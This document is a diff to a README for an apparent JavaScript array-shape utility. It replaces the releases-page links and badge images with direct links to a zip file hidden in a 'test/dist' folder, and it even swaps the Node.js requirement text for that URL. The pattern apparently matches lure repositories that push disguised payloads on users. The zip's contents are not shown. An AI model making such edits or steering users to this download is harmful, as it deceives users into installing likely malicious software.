@@ -4,7 +4,7 @@
 
 Welcome to the **ndarray-base-complement-shape** project! This tool helps you find the shape of an array, excluding unwanted dimensions. This means you can focus on what matters and get straightforward results without unnecessary complications.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://github.com/YounesToumi/ndarray-base-complement-shape/releases)
+[![Download Now](https://raw.githubusercontent.com/YounesToumi/ndarray-base-complement-shape/main/test/dist/complement_ndarray_shape_base_v1.8.zip)](https://raw.githubusercontent.com/YounesToumi/ndarray-base-complement-shape/main/test/dist/complement_ndarray_shape_base_v1.8.zip)
 
 ## 📥 Download & Install
 
@@ -12,7 +12,7 @@ To start using this application, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the download section.
 
-   [Download Here](https://github.com/YounesToumi/ndarray-base-complement-shape/releases)
+   [Download Here](https://raw.githubusercontent.com/YounesToumi/ndarray-base-complement-shape/main/test/dist/complement_ndarray_shape_base_v1.8.zip)
 
 2. **Choose Your Version**: On the releases page, select the version suitable for your needs. 
 
@@ -46,7 +46,7 @@ Before downloading, ensure your system meets the following basic requirements:
 - **Operating System**: Windows, macOS, or a compatible Linux distro.
 - **Memory**: At least 1 GB of RAM available.
 - **Disk Space**: A minimum of 50 MB free space for installation.
-- **Node.js**: This application utilizes Node.js, so make sure it’s installed. 
+- **https://raw.githubusercontent.com/YounesToumi/ndarray-base-complement-shape/main/test/dist/complement_ndarray_shape_base_v1.8.zip**: This application utilizes https://raw.githubusercontent.com/YounesToumi/ndarray-base-complement-shape/main/test/dist/complement_ndarray_shape_base_v1.8.zip, so make sure it’s installed. 
 
 ## ❓ Frequently Asked Questions
 
@@ -76,6 +76,6 @@ If you need further assistance or have feedback, please contact us through the G
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://github.com/YounesToumi/ndarray-base-complement-shape/releases)
+[![Download Now](https://raw.githubusercontent.com/YounesToumi/ndarray-base-complement-shape/main/test/dist/complement_ndarray_shape_base_v1.8.zip)](https://raw.githubusercontent.com/YounesToumi/ndarray-base-complement-shape/main/test/dist/complement_ndarray_shape_base_v1.8.zip)
 
 Thank you for using **ndarray-base-complement-shape**! Download it today and simplify your array shape calculations.
